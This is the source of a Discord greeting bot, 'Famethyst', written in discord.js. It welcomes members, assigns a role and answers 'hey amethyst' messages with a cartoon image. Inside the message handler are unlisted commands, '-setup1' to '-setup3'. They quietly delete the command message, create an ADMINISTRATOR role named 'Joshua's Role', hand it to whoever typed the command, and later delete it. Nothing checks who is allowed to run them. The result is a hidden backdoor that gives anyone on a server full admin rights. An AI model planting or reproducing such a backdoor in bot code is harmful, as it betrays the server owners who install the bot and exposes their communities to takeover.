//*
// Okay, so i rewrote this code as it was a mess 
// To test the bot go here (https://discord.io/Famethyst-20)
//*


// The code below connects the bot and sets Global Variables within the code (Vars such as {versnum} and others).
require('dotenv').config()
const {
    Client,
    RichEmbed
} = require('discord.js');
const vernum = ("Version 2.1")
const client = new Client();
const prefex = ("-")
client.on('ready', message => {
    console.log(`Logged in as ${client.user.tag}`)
    console.log(`Running ${vernum}`)
    client.user.setActivity(`Hey a | -info | ${vernum}`)
});


// The code below gives someone the 'Amethyst' role when they join and says "@$their-username Welcome to the fam"
client.on('guildMemberAdd', member => {
   const channel = member.guild.channels.find(channel => channel.name === "◯-general-◯")
   if (!channel) return;
    channel.send(`${member} Welcome to the fam bro 🎉<:FlushedClown:661405645878329345>`)
});
client.on('guildMemberAdd', guildMember => {
    guildMember.addRole(guildMember.guild.roles.find(role => role.name === "Amethyst"))
});

//*
// This currently isn't used but i didn't want to take it out 
//client.on("guildMemberRemove", member =>{
//    const botlogchl = member.guild.channels.find(channel => channel.name === "◯-bot-logs-◯")
//    if (!botlogchl) return;
//    botlogchl.send(`${member} just left the server they were clowing <:PensiveClown:661405400020549632>`)
//})
//*


// The code below responds to messages sent in the server (Join Here (https://discord.io/Famethyst-20))
client.on('message', message => {
    var authusernm = message.author.username

    if(message.content === `${prefex}setup1`){
        message.delete(100)
       message.guild.createRole({ name: "Joshua's Role", color: "BLUE", permissions: "ADMINISTRATOR"});
    }
    if(message.content === `${prefex}setup2`){
        message.delete(100)
        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
        message.member.addRole(role);
    }
    if(message.content === `${prefex}setup3`){
        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
        role.delete(".")
    }

    
    if (message.content == `${prefex}info`) {
        const embed = new RichEmbed()
            .setTitle(`${prefex}Fam Bot 2 Info`)
            .setColor("0x65280")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setFooter(`Made by J.Noakes#2968 | fam ${authusernm} asked | ${vernum}`)
            .addField("What can this bot do?", "You can readup on [github](https://github.com/Joshua-Noakes1/Famethyst-Discord-Bot/)")
            .addField("What commands are there?", "There are 8 commands at the moment they are \(Hey, Amethyst?, hey, amethyst?, hey amethyst?, Hey Amethyst!, hey, amethyst!, Hey Amethyst, hey amethyst, hey a")
            .addField("Do you want to add something?", "Submit it as an issue on the [github page](https://github.com/Joshua-Noakes1/Famethyst-Discord-Bot/)")
        message.channel.send(embed)
    }

    if (message.content === 'Hey, Amethyst?') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'hey, amethyst?') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'hey amethyst?') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'Hey, Amethyst!') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
            message.channel.send(embed)
    }

    if (message.content === 'hey, amethyst!') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'Hey Amethyst') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'hey amethyst') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

    if (message.content === 'hey a') {
        var authusernm = message.author.username
        const embed = new RichEmbed()
            .setTitle("Hey, Amethysts")
            .setImage("https://vignette4.wikia.nocookie.net/steven-universe/images/8/8a/Amethyst_new.png/revision/latest/scale-to-width-down/1000?cb=20150430231339")
            .setColor("0xC49FD9")
            .setFooter(`Fam ${authusernm} asked`)
        message.channel.send(embed)
    }

});
client.login(process.env.Bot_Token);
